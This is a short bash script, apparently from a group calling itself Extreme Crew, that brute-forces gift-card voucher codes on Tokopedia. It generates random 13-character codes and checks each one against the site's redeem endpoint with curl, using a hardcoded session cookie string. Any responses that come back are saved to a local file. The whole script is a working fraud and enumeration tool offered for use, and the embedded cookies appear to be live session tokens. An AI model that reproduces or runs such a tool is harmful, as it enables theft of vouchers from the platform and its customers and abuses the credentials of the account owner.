#Coded By AchonkJust - Extreme Crew
#issued 07-Mar-2018
#ToloPedia Extrap auto redeem voucher
#Update!!
#!/bin/bash/sh
putih='\033[0m'
ijo='\e[38;5;82m'
merah='\e[38;5;196m'
 header(){
printf "${ijo}"
printf "     ___        __                _____ _____ _____   _       ________    \n"
printf "    /   | _____/ /_  ____  ____  / ___// ___// ___/  (_)_  __/ ____/ /_   \n"
printf "   / /| |/ ___/ __ \/ __ \/ __ \/ __ \/ __ \/ __ \  / / / / /___ \/ __/   \n"
printf "  / ___ / /__/ / / / /_/ / / / / /_/ / /_/ / /_/ / / / /_/ /___/ / /_     \n"
printf " /_/  |_\___/_/ /_/\____/_/ /_/\____/\____/\____/_/ /\__,_/_____/\__/     \n"
printf "==========ToloPedia Extrap Voucher=============/___/ By Extreme.Crew 	  \n"
}
rm -f extreme.crew
clear
header
if [ ! $1 ];then
echo "1 Akun Max 10 kali generate"
echo "Usage : $0 <jumlah generate>"
echo "EX : $0 10"
exit
fi
#Edit Your Cookies Here
ngelog(){
cok="_gorilla_csrf=MTUzODc2NTE5MXxJa05MYmxGeFpsVlFMM0ZuUjFrNVZtVTNlbmRGZDNodFRHUkJVV1ZqZWxSV2NrWkNhVEZuU0dJd2VrRTlJZ289fNRwu_AgdMr0r4de6a4q4zqVuJglzy6yIcGoYj1OnUnS; _ga=GA1.2.68010496.1538498398; _gcl_au=1.1.111113656.1538498398; __auc=de8ce90216635a68829b4678ff7; scs=%7B%22t%22%3A1%7D; _BID_TOKOPEDIA_=1454fff044ad2b3decd929eff9c932c4; lang=id; insdrSV=2; __asc=21113cd3166458b866d8a351bbc; pulsa-aff=undefined; _gid=GA1.2.177169813.1538765065; zarget_visitor_info=%7B%7D; USER_DATA=%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%2212239bd7-3cd6-4cf7-b6af-7caa8d4618d3%22%2C%22deviceAdded%22%3Afalse%7D; SOFT_ASK_STATUS=%7B%22actualValue%22%3A%22not%20shown%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D; HARD_ASK_STATUS=%7B%22actualValue%22%3A%22prompt%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D; o_Pulsa=eyJsYXN0X2RlY2xpbmUiOiIiLCJyZWZlcnJlciI6Imh0dHBzOi8vcHVsc2EudG9rb3BlZGlhLmNvbS9naWZ0LWNhcmQvdG9rb3BlZGlhL3JlZGVlbS8iLCJpc19taWNyb3NpdGUiOmZhbHNlLCJ1dWlkIjoiMjRkMThiNWItNGZmYy00NjAzLWIwMmEtZGE4OTM0MmVlMzJhIiwiaXNfYWpheCI6ZmFsc2V9; _SID_Tokopedia_=E3C3-n6EEwjrJWf8aU14n1ubxk9iAy-JHKIsWpJ4Xw92hifxjjBk__-lWvZTYqM9b_iGgBgp7DqWkZP54rNxol2FIcyK0KiC49Ijeo4uJVzIHGkh2gdjjtZyZu3A4Xsf; l=1; _ga=GA1.3.68010496.1538498398; _gid=GA1.3.177169813.1538765065; OPT_IN_SHOWN_TIME=1538765852885"
	curl -s -X GET \
--url "https://pulsa.tokopedia.com/gift-card/tokopedia/redeem/check?voucher_code=FPL$1" \
-H "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" \
-H "accept-encoding: gzip, deflate, br" \
-H "cookie: $cok" \
-H "accept-language: en-US,en;q=0.9" \
-H "cache-control: max-age=0" \
-H "upgrade-insecure-requests: 1" \
-H "user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTssML, like Gecko) Ubuntu Chromium/65.0.3325.181 Chrome/65.0.3325.181 Safari/537.36"
}

for generate in $(cat /dev/urandom | tr -dc 'A-Z0-9' | fold -w 13 | head -n 10); do
	ngegas=$(ngelog $generate | grep -Po "(?<=\"message\":\").*?(?=\"\,\")")
	if [[ "$ngegas" ]]; then
		echo "$ngegas"
		echo "[-$ngegas-] $generate" >> tokopedia.txt
	fi
done
rm -f extreme.crew
